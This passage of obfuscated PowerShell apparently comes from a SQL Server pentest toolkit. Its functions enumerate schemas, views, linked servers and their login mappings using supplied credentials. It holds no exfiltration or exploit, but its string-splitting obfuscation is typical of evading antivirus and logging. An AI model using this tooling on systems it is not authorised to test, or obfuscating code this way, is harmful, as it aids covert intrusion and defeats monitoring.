        [Parameter(maNdaTORY = ${F`ALSE},
        HElpMEsSAGE = {"{0}{3}{2}{1}" -f 'Windo','als.','edenti','ws cr'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CrE`D`EnTial} =   (vArIAble  0459m2).VaLuE::"EMP`Ty",

        [Parameter(maNDatoRY = ${FA`L`se},
                VaLuEFroMpipELinEByPRoperTyNAME = ${TR`UE},
        HelpmessAge = {"{0}{8}{4}{3}{1}{9}{7}{2}{6}{5}" -f 'SQL','ance','nection','inst','rver ','o.',' t','con',' Se',' to '})]
        [string]${i`NS`TAncE},

        [Parameter(maNDatOry = ${f`A`lse},
                vALuEfROMpiPElinebYPropertYnAme = ${t`Rue},
        HelpMESsaGE = {"{0}{3}{1}{2}" -f 'Database ','a','me.','n'})]
        [string]${dA`Tab`AsENA`mE},

        [Parameter(mANDaTOry = ${fA`lSE},
                ValuEfromPiPeLiNEBYpROPErtynAme = ${TR`UE},
        heLPmeSSage = {"{1}{3}{0}{2}" -f'ma name','Sc','.','he'})]
        [string]${SC`hemA`NAme},

        [Parameter(ManDaTORY = ${Fa`lSe},
        HELpMEssAgE = {(("{9}{5}{10}{4}{1}{3}{8}{12}{6}{2}{11}{7}{0}"-f'ses.','ct','at',' schemas from','e','on','t d','a',' def','D','GWZt sel','ab','aul'))."ReP`lA`Ce"(([char]71+[char]87+[char]90),[stRING][char]39)})]
        [switch]${N`ODEF`AULtS},

        [Parameter(mandAtoRy = ${f`AL`sE},
        HElpMESSAgE = {"{6}{3}{8}{1}{2}{7}{4}{0}{5}" -f'den by d',' role',' based sche','atab','s. Hid','efault.','Show d','ma','ase'})]
        [switch]${shO`w`RO`lEscheMAs},

        [Parameter(maNDATory = ${F`AlsE},
        HELPmEssAgE = {"{8}{2}{11}{10}{13}{4}{5}{3}{7}{1}{0}{6}{12}{9}" -f'r','w','uppre',' Used whe','rrors','. ','a','n function is ','S','d.','s','s','ppe',' verbose e'})]
        [switch]${sUP`PRESS`VerB`Ose}
    )

    Begin
    {
        
        ${T`B`lsCHEmAS} = &("{2}{0}{1}" -f 'c','t','New-Obje') -TypeName ("{0}{3}{4}{1}{5}{2}" -f'S','at','ble','ys','tem.D','a.DataTa')

        
        if(${Sc`HE`MANa`me})
        {
            ${Sch`EMANA`MefiL`TER} = (' '+'wh'+'ere '+'s.'+'name'+' '+'l'+'ike '+"'%$SchemaName%'")
        }
        else
        {
            ${s`CH`emaNAmEf`i`lteR} = ''
        }
    }

    Process
    {
        
        ${cO`MpuTER`N`AME} = &("{4}{3}{5}{6}{1}{7}{2}{0}" -f'tance','F','ns','t-','Ge','Comput','erName','romI') -Instance ${i`NS`TAnCE}

        
        if(-not ${INS`Ta`NCe})
        {
            ${inST`ANCe} = ${eNv:Com`Put`ern`AME}
        }

        
        ${TeStc`o`NN`ect`Ion} = &("{5}{0}{6}{3}{1}{2}{4}"-f 'QLCo','nT','e','nectio','st','Get-S','n') -Instance ${INSTan`cE} -Username ${us`ErN`AMe} -Password ${p`A`sSw`oRd} -Credential ${Cr`Ede`Nt`iAL} -SuppressVerbose | &("{1}{0}{2}" -f 'ere-Obje','Wh','ct') -FilterScript {
            ${_}."sta`T`US" -eq ("{1}{3}{0}{2}" -f'ssib','Ac','le','ce')
        }
        if(${t`EsT`CONNeCt`IOn})
        {
            if( -not ${S`UPP`RESs`Verb`oSe})
            {
                &("{1}{2}{0}"-f 'rbose','Write','-Ve') -Message ("$Instance "+': '+'Conn'+'e'+'ct'+'ion '+'Succe'+'s'+'s.')
            }
        }
        else
        {
            if( -not ${S`UP`pReSSVER`BoSe})
            {
                &("{2}{0}{1}{3}"-f 'rite-V','erbos','W','e') -Message ("$Instance "+': '+'Connecti'+'o'+'n '+'Fai'+'l'+'ed.')
            }
            return
        }

        
        if(${NO`DEFAu`LTs})
        {
            
            ${t`B`ldA`TAbASEs} = &("{0}{1}{2}" -f 'Get-','SQLData','base') -Instance ${iN`s`TAN`CE} -Username ${u`Ser`NaMe} -Password ${Pas`S`woRD} -Credential ${CR`EDENti`Al} -DatabaseName ${da`TA`Ba`SeNAme} -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            
            ${tbL`DAT`A`Ba`ses} = &("{1}{2}{0}"-f'-SQLDatabase','G','et') -Instance ${INs`TANCe} -Username ${u`seRNa`mE} -Password ${P`AsSWORD} -Credential ${c`ReDENT`IAL} -DatabaseName ${d`ATabASE`NaMe} -HasAccess -SuppressVerbose
        }

        
        ${Tb`ldA`T`ABA`SeS} |
        &("{3}{2}{0}{1}{4}"-f'-Obj','e','ach','ForE','ct') -Process {
            
            ${D`BNa`ME} = ${_}."d`Ataba`sE`NAMe"

            if( -not ${supPr`es`SVeR`BoSe})
            {
                &("{0}{1}{2}{3}"-f 'W','rite-Verbo','s','e') -Message ("$Instance "+': '+'G'+'ra'+'bbing'+' '+'S'+'chemas'+' '+'from'+' '+'t'+'he '+"$DbName "+'database'+'..'+'.')
            }

            
            ${Q`Uery} = (' '+' '+'U'+'SE '+"$DbName;
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'S'+'EL'+'ECT '+' '+"'$ComputerName' "+'a'+'s '+'[Com'+'pu'+'t'+'erNam'+'e],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'a'+'s '+'[Inst'+'a'+'nce]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'D'+'B_NAM'+'E()'+' '+'AS'+' '+'[Datab'+'a'+'seN'+'ame],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'.'+'sche'+'ma_id '+'AS'+' '+'[S'+'che'+'maId]'+','+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'.name '+'AS'+' '+'[Sche'+'maNa'+'me'+'],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.pr'+'i'+'ncipa'+'l_id '+'A'+'S '+'['+'Own'+'erI'+'d],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'US'+'ER_NA'+'ME('+'s.pr'+'incipal_'+'id) '+'AS'+' '+'[O'+'wne'+'r'+'Nam'+'e]
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FROM'+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'sys.sch'+'em'+'a'+'s '+'A'+'S '+'s'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'JO'+'IN '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"[$DbName].[INFORMATION_SCHEMA].[SCHEMATA] "+'A'+'S '+'i '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'O'+'N '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.'+'nam'+'e '+'= '+'i.'+'SCH'+'EMA_NAME'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$SchemaNameFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'OR'+'DER '+'B'+'Y '+'s.name'+';')

            
            ${Tblr`e`suLTs} = &("{1}{3}{2}{0}" -f 'ery','G','u','et-SQLQ') -Instance ${Inst`An`Ce} -Query ${q`Uery} -Username ${Use`RNA`Me} -Password ${Pa`ssWO`Rd} -SuppressVerbose

            
            ${TblScHE`M`AS} = ${t`BLS`cHeMas} + ${t`Bl`Re`sULTs}
        }
    }

    End
    {
        
        if(${sHow`Ro`L`e`SCHEmaS}){
            ${t`BLsC`hEmAS} 
        }else{
            ${tblsCH`E`M`As} | &("{0}{1}" -f'Whe','re') ("{2}{0}{1}"-f 'ma','Id','Sche')  -lt 1000
        }
    }
}






Function  G`eT-s`QlvIEW
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MandaTorY = ${F`A`LSE},
        helpmEssaGE = {"{0}{5}{4}{7}{2}{8}{3}{6}{1}"-f'SQ','with.','to','tic',' or domain account','L Server','ate ',' ',' authen'})]
        [string]${USE`RN`Ame},

        [Parameter(MandATorY = ${F`AlSE},
        hElpMESSaGE = {"{14}{8}{1}{0}{5}{15}{11}{2}{6}{3}{12}{9}{10}{13}{7}{4}"-f'r','ver o','ount','r','th.',' doma',' passwo','te wi',' Ser','au','thenti',' acc','d to ','ca','SQL','in'})]
        [string]${pA`ssWord},

        [Parameter(MaNDAtOry = ${Fa`LSe},
        hElpmEssage = {"{4}{1}{2}{0}{3}" -f 's','e','dential','.','Windows cr'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${c`RedENTi`Al} =  $0459M2::"eM`ptY",

        [Parameter(MANDAtOrY = ${fA`lsE},
                VALueFROmpiPElinEBYPrOPerTYNaMe = ${Tr`UE},
        heLPmeSsage = {"{3}{6}{4}{2}{1}{5}{7}{0}{8}" -f'on','c',' instance to conne','SQL Serv','r','t','e','i',' to.'})]
        [string]${i`Ns`Tance},

        [Parameter(MaNDaTOry = ${f`ALse},
                VALUeFROMPipELinebypropErtYNamE = ${t`RUe},
        HElPmeSSAGe = {"{2}{3}{1}{0}"-f 'ame.','ase n','Data','b'})]
        [string]${D`AT`ABas`EnA`mE},

        [Parameter(mAnDAtOry = ${f`AlSe},
                VaLueFrompIPElInEBypROpErTynAMe = ${tr`UE},
        HElPmessaGe = {"{2}{3}{1}{0}"-f '.','e','View ','nam'})]
        [string]${V`iEwNa`mE},

        [Parameter(MANdATory = ${Fa`L`Se},
        heLpmESSaGE = {(("{11}{9}{2}{7}{5}{1}{0}{3}{6}{10}{8}{4}" -f 'o','r','a','m d','.','f','efault d','bles ','ases',' select t','atab','Don{0}t'))  -f  [chAR]39})]
        [switch]${nO`DEfAu`l`Ts},

        [Parameter(mANDAToRy = ${fA`LSe},
        helPmeSsAGe = {"{9}{8}{2}{3}{11}{1}{4}{0}{7}{12}{13}{5}{6}{10}" -f 'c',' w','ppres','s verbose ','hen fun',' ','wrapped','t','u','S','.','errors.  Used','i','on is'})]
        [switch]${sUpp`R`ESsVerBosE}
    )

    Begin
    {
        
        ${T`BlV`IEWS} = &("{2}{3}{0}{1}"-f 'jec','t','New-O','b') -TypeName ("{4}{1}{3}{2}{5}{0}" -f'Table','s','.Data.Dat','tem','Sy','a')

        
        if(${v`i`ewnamE})
        {
            ${V`IE`w`FILteR} = (' '+'w'+'he'+'re '+'ta'+'ble_n'+'ame '+'lik'+'e '+"'%$ViewName%'")
        }
        else
        {
            ${V`Iewfi`LTEr} = ''
        }
    }

    Process
    {
        
        ${COM`p`UTErnA`mE} = &("{0}{6}{4}{3}{5}{2}{1}"-f'G','stance','In','p','om','uterNameFrom','et-C') -Instance ${iN`sTa`Nce}

        
        if(-not ${ins`TAN`ce})
        {
            ${I`Nst`ANCE} = ${env:`coMpUTErN`A`ME}
        }

        
        ${t`eSTcONNEC`TIoN} = &("{3}{4}{0}{5}{1}{2}"-f 'S','ectionTe','st','Get','-','QLConn') -Instance ${iNsT`ANce} -Username ${Use`R`NaMe} -Password ${PAsSw`o`RD} -Credential ${creD`Ent`IaL} -SuppressVerbose | &("{1}{2}{0}" -f're-Object','W','he') -FilterScript {
            ${_}."sTat`Us" -eq ("{1}{2}{3}{0}" -f'ible','Acc','es','s')
        }
        if(${T`EstcoNn`e`ct`Ion})
        {
            if( -not ${S`UppResS`Verbo`Se})
            {
                &("{1}{0}{2}" -f'Ver','Write-','bose') -Message ("$Instance "+': '+'C'+'o'+'nne'+'ction '+'S'+'ucces'+'s.')
                &("{0}{1}{2}"-f'Write','-Ve','rbose') -Message ("$Instance "+': '+'Gra'+'bbi'+'ng '+'vi'+'ews'+' '+'fr'+'om '+'t'+'he '+'da'+'taba'+'ses '+'be'+'l'+'ow:')
            }
        }
        else
        {
            if( -not ${suPP`RESSvEr`Bo`SE})
            {
                &("{0}{1}{2}{3}" -f 'Wri','te-','Verbo','se') -Message ("$Instance "+': '+'Conn'+'e'+'ction'+' '+'Failed'+'.')
            }
            return
        }

        
        if(${nO`defAUL`TS})
        {
            
            ${T`BlDAt`A`BaSES} = &("{2}{3}{4}{0}{1}" -f 's','e','Get-SQ','LD','ataba') -Instance ${InStA`N`CE} -Username ${UsEr`NA`ME} -Password ${Pas`s`WorD} -Credential ${cRed`EN`TIAL} -DatabaseName ${d`AtabAs`eNaME} -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            
            ${TBlDATA`B`AS`eS} = &("{2}{1}{0}{3}"-f'ba','t-SQLData','Ge','se') -Instance ${In`st`AncE} -Username ${u`sE`RNaMe} -Password ${P`ASswO`Rd} -Credential ${Cr`eD`E`NTiAL} -DatabaseName ${D`ATA`B`A`SenaMe} -HasAccess -SuppressVerbose
        }

        
        ${TBl`Dat`AbasEs} |
        &("{2}{1}{0}{3}"-f 'Obje','ch-','ForEa','ct') -Process {
            
            ${Db`Na`ME} = ${_}."dAtabA`sE`NAME"

            if( -not ${SupPRE`ssVERb`osE})
            {
                &("{4}{3}{0}{2}{1}"-f'r','e','bos','e-Ve','Writ') -Message ("$Instance "+': '+'- '+"$DbName")
            }

            
            ${Q`UeRY} = (' '+' '+'USE'+' '+"$DbName;
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SE'+'L'+'ECT '+' '+"'$ComputerName' "+'a'+'s '+'[Co'+'mp'+'uterNa'+'me],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'[Instan'+'ce]'+','+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'TABLE'+'_CA'+'TALOG '+'as'+' '+'[Da'+'tab'+'ase'+'Name],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'TABL'+'E_SCH'+'EM'+'A '+'as'+' '+'['+'S'+'chemaName'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'TAB'+'L'+'E_NAME '+'as'+' '+'['+'Vie'+'wNa'+'me],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'VIEW_DEFINI'+'TIO'+'N'+' '+'as'+' '+'[ViewD'+'e'+'finition'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'IS'+'_UP'+'DAT'+'ABLE '+'a'+'s '+'[I'+'sUpdata'+'ble]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'CHECK_OP'+'T'+'IO'+'N '+'as'+' '+'[Check'+'Optio'+'n]
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FROM'+' '+' '+' '+' '+'[INFO'+'R'+'M'+'ATION_S'+'CHEMA].['+'V'+'IE'+'WS'+']
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$ViewFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ORD'+'ER '+'B'+'Y '+'TABLE_C'+'A'+'TALOG,'+'TABLE_SCHE'+'MA,TABLE_'+'NA'+'ME')

            
            ${Tb`lrE`su`LTS} = &("{2}{0}{1}" -f 't-S','QLQuery','Ge') -Instance ${I`NSt`Ance} -Query ${Q`UERy} -Username ${UsE`R`NamE} -Password ${pA`S`sW`oRd} -Credential ${cr`e`d`eNTIal} -SuppressVerbose

            
            ${t`BL`ViEWS} = ${tbLvI`e`ws} + ${tbLr`eSuL`Ts}
        }
    }

    End
    {
        
        ${tbl`Vi`Ews}
    }
}






Function  Get-Sql`s`eR`VeRliNK
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MaNDAtoRY = ${Fa`LSe},
        HElPmEssAgE = {"{9}{3}{0}{1}{5}{11}{7}{2}{8}{10}{6}{4}" -f'ver or doma','in ac','u','L Ser',' with.','count t','e','a','thent','SQ','icat','o '})]
        [string]${uSe`RN`AmE},

        [Parameter(mandaToRy = ${fa`L`SE},
        helpmeSsAGE = {"{7}{5}{9}{16}{8}{14}{4}{12}{6}{15}{13}{10}{2}{1}{0}{11}{3}"-f ' w','icate','nt','.','wor','om',' t','SQL Server or d',' accou','ai','uthe','ith','d','a','nt pass','o ','n'})]
        [string]${Pas`swOrd},

        [Parameter(manDATORY = ${fa`lsE},
        helpMEssage = {"{0}{3}{5}{2}{4}{1}" -f 'W','ntials.','cred','i','e','ndows '})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${C`RED`eNtIaL} =   $0459m2::"e`Mpty",

        [Parameter(ManDatoRy = ${f`AL`sE},
                VALUEfROMPIPELInEByprOpErTYnAmE = ${Tr`Ue},
        hElPMEsSagE = {"{6}{4}{0}{5}{9}{2}{1}{3}{7}{8}"-f'er insta','nect','con','io','L Serv','n','SQ','n',' to.','ce to '})]
        [string]${In`StAN`CE},

        [Parameter(MAndaTOrY = ${FA`L`SE},
                vAlUEfRomPiPELinE = ${T`Rue},
                valUefRomPipelINeByPrOPeRTYNaME = ${t`Rue},
        HElpMESsaGe = {"{2}{0}{3}{4}{1}" -f'r','e.','SQL Se','ver link ','nam'})]
        [string]${d`ATaba`s`elINKNAME},

        [Parameter(manDATOry = ${f`Al`sE},
        HELpmeSsagE = {"{6}{11}{1}{13}{5}{2}{3}{7}{8}{4}{9}{0}{10}{12}"-f 'ion ','b','rors.','  Used ',' ','er','Suppress ','w','hen','funct','i','ver','s wrapped.','ose '})]
        [switch]${SUP`PreSsVE`RB`O`se}
    )

    Begin
    {
        
        ${tBls`erverlI`N`ks} = &("{0}{1}{3}{2}"-f 'Ne','w-Obj','t','ec') -TypeName ("{2}{4}{5}{3}{0}{1}"-f 'ataT','able','Sy','D','stem','.Data.')

        
        if(${d`ATABA`S`EliNknaMe})
        {
            ${vDaTa`Ba`SeLiNKNA`Me`FiL`T`ER} = (' '+'WH'+'E'+'RE '+'a.nam'+'e '+'li'+'ke '+"'$DatabaseLinkName'")
        }
        else
        {
            ${dATABase`LiNknam`eF`i`LT`eR} = ''
        }
    }

    Process
    {
        
        ${C`OMPUteR`NamE} = &("{2}{0}{5}{3}{1}{4}{6}" -f't-','ameF','Ge','terN','romInsta','Compu','nce') -Instance ${in`sTanCE}

        
        if(-not ${i`NStA`NcE})
        {
            ${i`N`sTAnCe} = ${env`:cOmpUt`E`R`Na`me}
        }

        
        ${TeST`Co`NNEc`TI`on} = &("{0}{3}{2}{4}{1}" -f 'Get','est','nnec','-SQLCo','tionT') -Instance ${i`NSTAN`cE} -Username ${uSE`RN`Ame} -Password ${PasS`W`oRD} -Credential ${crEDe`N`TIAL} -SuppressVerbose | &("{0}{2}{1}"-f'Where','ct','-Obje') -FilterScript {
            ${_}."stA`TuS" -eq ("{2}{3}{0}{1}" -f 'cessib','le','A','c')
        }
        if(${t`ES`TConN`ECTI`oN})
        {
            if( -not ${sU`Pp`REsSvERB`osE})
            {
                &("{0}{1}{2}"-f 'Write-V','erbos','e') -Message ("$Instance "+': '+'C'+'onnectio'+'n '+'Success'+'.')
            }
        }
        else
        {
            if( -not ${SUPpRes`sV`erb`OsE})
            {
                &("{1}{3}{2}{0}{4}" -f 'Ve','Writ','-','e','rbose') -Message ("$Instance "+': '+'C'+'onn'+'e'+'ction '+'Fa'+'iled.')
            }
            return
        }

        
        ${qU`e`Ry} = (' '+' '+'SE'+'LEC'+'T '+' '+"'$ComputerName' "+'a'+'s '+'[C'+'om'+'p'+'uterName],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'[In'+'stan'+'ce],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.server_i'+'d'+' '+'as'+' '+'[Da'+'taba'+'seLink'+'I'+'d],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'.name '+'AS'+' '+'[Da'+'tab'+'aseLinkName'+'],'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'C'+'ASE '+'a.S'+'er'+'ver_id
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WH'+'EN '+'0'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'T'+'HEN '+('NsVLoc'+'alNsV
'+' ')."REP`LACe"(([cHAR]78+[cHAR]115+[cHAR]86),[stRinG][cHAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'LSE '+('n'+'fuR'+'emote'+'nfu
 ')."R`epL`ACE"('nfu',[StrIng][chAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'END'+' '+'A'+'S '+'[Data'+'base'+'LinkLocati'+'on],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.pr'+'o'+'d'+'uct '+'as'+' '+'['+'Pro'+'duct],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.pr'+'ovider'+' '+'as'+' '+'[Pro'+'vider]'+','+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.ca'+'tal'+'o'+'g '+'a'+'s '+'[Cat'+'alog'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('{0}L'+'o'+'calLogi'+'n{0} ')-f  [cHAr]39+'= '+'C'+'ASE '+'b'+'.use'+'s_s'+'elf_creden'+'t'+'ial
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'W'+'HEN '+'1 '+'T'+'HEN '+(('Y'+'PdUses'+' ') -crEPlACE  ([Char]89+[Char]80+[Char]100),[Char]39)+'Sel'+'f '+('Credentials'+'4'+'e7
'+' ')."Re`pL`AcE"('4e7',[STRinG][CHAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ELSE'+' '+'c.n'+'am'+'e
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'END,
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'b.rem'+'ot'+'e_name'+' '+'AS'+' '+'[Remote'+'Log'+'inN'+'a'+'m'+'e'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.is_r'+'pc_o'+'ut_en'+'a'+'bled,'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'.is_data_acc'+'ess_e'+'n'+'abled,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.modify'+'_'+'da'+'te
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FROM'+' '+'[Maste'+'r].[sys].[S'+'er'+'ve'+'rs] '+'a'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'LEFT'+' '+'JOIN'+' '+'[M'+'aster'+'].[sys].['+'l'+'inke'+'d'+'_'+'login'+'s'+'] '+'b'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'O'+'N '+'a.'+'serve'+'r_id'+' '+'= '+'b'+'.serve'+'r_id
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'LE'+'FT '+'J'+'OIN '+'[Ma'+'ste'+'r].['+'s'+'ys].'+'[server_principals]'+' '+'c'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'O'+'N '+'c.princ'+'i'+'pal_i'+'d '+'= '+'b.l'+'oc'+'al_p'+'ri'+'ncipal_'+'id
'+' '+' '+' '+' '+' '+' '+' '+' '+"$DatabaseLinkNameFilter")

        
        ${tbLr`esul`Ts} = &("{1}{3}{0}{2}" -f'uer','Get-S','y','QLQ') -Instance ${i`NStAn`ce} -Query ${QUe`RY} -Username ${U`SErN`AMe} -Password ${pAs`s`WO`Rd} -Credential ${crEd`EntI`Al} -SuppressVerbose

        
        ${TBL`sER`VER`li`NKS} = ${Tblse`RVE`R`LinkS} + ${TBLr`eS`UlTS}
    }

    End
    {
        
        ${TBLseR`VEr`l`InKS}
    }
}






Function  GeT-SQ`lseRv`er`CoNfI`g`UrA`Ti`oN
{
    
    [CmdletBinding()]
    Param(
        [Parameter(maNdaTorY = ${F`AL`se},
        helPMesSaGE = {"{2}{4}{5}{7}{8}{3}{6}{1}{0}"-f'.','h','S','enticate','QL Server',' or doma',' wit','in acc','ount to auth'})]
        [string]${u`sERn`Ame},

        [Parameter(mAnDATORY = ${FAl`se},
        helPMEssaGe = {"{1}{7}{4}{6}{8}{5}{0}{12}{2}{13}{10}{14}{3}{11}{9}"-f'n','SQL S',' passwo','e ',' do','u','m','erver or','ain acco','h.',' to authen','wit','t','rd','ticat'})]
        [string]${paS`sw`oRd},

        [Parameter(manDAtoRY = ${fa`lSe},
        helPMEsSAge = {"{0}{2}{4}{1}{3}" -f 'Win','crede','dow','ntials.','s '})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${c`R`ED`EnTIaL} =  (  variabLE 0459M2 ).ValUE::"Em`PTY",

        [Parameter(MaNdatory = ${FaL`Se},
                valuefrOMpipeLInEByPrOpErTynAMe = ${T`RuE},
        HelpMessaGE = {"{0}{2}{4}{9}{5}{6}{7}{1}{8}{10}{3}"-f 'SQL Se','nection','rver ins','.','t','nce to c','o','n',' t','a','o'})]
        [string]${INs`TAn`ce},

        [Parameter(manDATorY = ${FAl`SE},
                vALUEFRoMPIpelInEBYpROpErtYNamE = ${tr`UE},
        heLpmESsaGe = {"{5}{0}{8}{10}{3}{7}{4}{9}{6}{2}{1}"-f'ubmer','e.','m','os',' to query','N','at one ti','ts',' o',' ','f h'})]
        [int]${t`HRE`Ads} = 5,

        [Parameter(MaNDAtORy = ${faL`Se},
        hELpmESsAGE = {"{6}{2}{3}{5}{7}{15}{1}{14}{12}{4}{11}{13}{0}{8}{16}{10}{9}" -f 'when fun','r','r','e',' Us','s','Supp','s','ction','ed.','wrapp','ed','rrors. ',' ','bose e',' ve',' is '})]
        [switch]${sUpp`Res`sve`R`B`OSE}
    )
    Begin
    {
        
        ${TblCO`M`MANDS} = &("{1}{0}{2}" -f'c','New-Obje','t') -TypeName ("{0}{2}{1}{3}" -f'System.D','ataTabl','ata.D','e')
        ${T`BlrE`Su`lts} = &("{2}{0}{1}"-f 'ew-Obj','ect','N') -TypeName ("{1}{3}{4}{0}{6}{2}{5}"-f'ata','Sys','b','t','em.D','le','.DataTa')
        ${n`UlL} = ${T`BLR`EsulTS}."cOlu`mNs".("{1}{0}"-f'd','Ad').Invoke(("{0}{1}{2}" -f'Co','mputerNa','me'))
        ${Nu`ll} = ${T`B`LRESU`LTS}."cOlu`m`Ns".("{0}{1}" -f'A','dd').Invoke(("{1}{0}{2}"-f'tan','Ins','ce'))
        ${n`Ull} = ${tBlReS`U`Lts}."col`Umns".("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}"-f'N','ame'))
        ${nu`LL} = ${tb`lREsU`lts}."cOl`UMns".("{0}{1}" -f 'A','dd').Invoke(("{0}{1}"-f'Min','imum'))
        ${n`Ull} = ${TBlReSU`L`Ts}."COlUM`NS".("{0}{1}" -f'A','dd').Invoke(("{0}{1}" -f'Ma','ximum'))
        ${n`UlL} = ${t`BLRES`ULtS}."co`luMNs".("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}{2}" -f 'c','onfig_valu','e'))
        ${N`Ull} = ${TBlre`S`UL`Ts}."cO`LUMNS".("{0}{1}"-f'Ad','d').Invoke(("{0}{2}{1}"-f 'run','lue','_va'))


        
        ${pIP`elIne`iT`Ems} = &("{2}{0}{1}"-f'Obj','ect','New-') -TypeName ("{4}{5}{6}{1}{3}{0}{2}"-f 'taTabl','ta','e','.Da','Syste','m.','Da')

        
        if(-not ${IN`St`AncE})
        {
            ${Ins`Ta`NcE} = ${En`V:ComP`UteR`NaMe}
        }

        
        if(${I`Nst`ANcE})
        {
            ${provi`DEi`N`stAnCe} = &("{1}{0}{2}"-f 'O','New-','bject') -TypeName ("{0}{1}{2}" -f'P','SObjec','t') -Property @{
                ("{1}{2}{0}" -f 'e','Ins','tanc') = ${i`NSTA`NCe}
            }
        }

        
        ${pIPelIneI`Te`mS} = ${PiPE`l`IneITems} + ${P`R`ovI`DeiNstAn`CE}
    }

    Process
    {
        
        ${PIPelin`Ei`TemS} = ${Pi`pel`in`EIT`EmS} + ${_}
    }

    End
    {
        
        ${M`YScR`ip`TB`lock} = {
            ${i`NsTanCE} = ${_}."I`N`StanCe"

            
            ${c`OMPuT`erName} = &("{3}{0}{1}{2}{4}"-f 't-ComputerNameF','rom','In','Ge','stance') -Instance ${INs`TAnCe}

            
            if(-not ${iNS`TA`NCE})
            {
                ${i`NSTAnCE} = ${e`Nv:`cOmpUT`e`RNaME}
            }

            
            if(${d`Ac})
            {
                
